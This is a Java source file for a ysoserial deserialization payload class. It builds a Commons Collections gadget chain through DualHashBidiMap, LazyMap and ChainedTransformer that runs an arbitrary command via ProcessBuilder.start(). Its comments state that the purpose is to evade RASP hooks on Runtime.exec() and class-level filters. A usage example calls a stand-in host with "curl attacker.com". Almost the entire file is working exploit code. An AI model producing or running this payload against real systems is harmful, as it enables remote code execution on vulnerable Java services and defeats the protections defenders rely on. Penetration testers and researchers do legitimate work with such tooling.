package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.bidimap.DualHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	RCE via ProcessBuilder.start() — bypasses Runtime.exec() hooks.

	Many RASP solutions (OpenRASP, Contrast, Sqreen) hook Runtime.exec()
	specifically. ProcessBuilder.start() is a different code path that is
	often missed by first-generation RASP rules.

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				HashMap.put(key, value)
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer → ProcessBuilder.class
										InstantiateTransformer... no, we use:
										InvokerTransformer → Runtime.getRuntime()
										...actually, let's construct ProcessBuilder directly:
										ConstantTransformer → String[]{cmd}
										InvokerTransformer → new ProcessBuilder(String[])
										    → constructor via reflection
										InvokerTransformer → ProcessBuilder.start()
											→ Process started ← RCE

	Filter evasion:
		1. DualHashBidiMap — not in any known filter
		2. ProcessBuilder.start() instead of Runtime.exec()
		   - RASP hooks on Runtime.exec() are bypassed
		   - Class-level filters rarely block ProcessBuilder
		3. Still uses InvokerTransformer (needed for reflection chain)

	vs CC18 (Runtime.exec):
		- Same entry point (DualHashBidiMap)
		- Different execution path: ProcessBuilder vs Runtime
		- Bypasses RASP rules that only hook Runtime.exec()

	Usage: payload arg = command (shell syntax)
		e.g. "calc.exe" or "/bin/bash -c 'curl attacker.com'"

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollectionsProcessBuilder extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		// Split command for ProcessBuilder
		// ProcessBuilder takes String[] not a single String
		final String[] cmdArray;
		if (command.contains(" ")) {
			// Simple split — for complex commands, user should use shell wrapper
			cmdArray = command.split(" ");
		} else {
			cmdArray = new String[] { command };
		}

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Chain: new ProcessBuilder(cmd).start()
		// Step 1: ConstantTransformer → ProcessBuilder.class
		// Step 2: InvokerTransformer → ProcessBuilder.class.getConstructor(String[].class)
		// Step 3: InvokerTransformer → constructor.newInstance(new Object[]{cmdArray})
		// Step 4: InvokerTransformer → processBuilder.start()
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(ProcessBuilder.class),
			new InvokerTransformer("getConstructor", new Class[] {
				Class[].class }, new Object[] {
				new Class[] { String[].class } }),
			new InvokerTransformer("newInstance", new Class[] {
				Object[].class }, new Object[] {
				new Object[] { cmdArray } }),
			new InvokerTransformer("start",
				new Class[0], new Object[0]),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put(entry, "bar");

		innerMap.remove("foo");

		// Arm
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsProcessBuilder.class, args);
	}
}
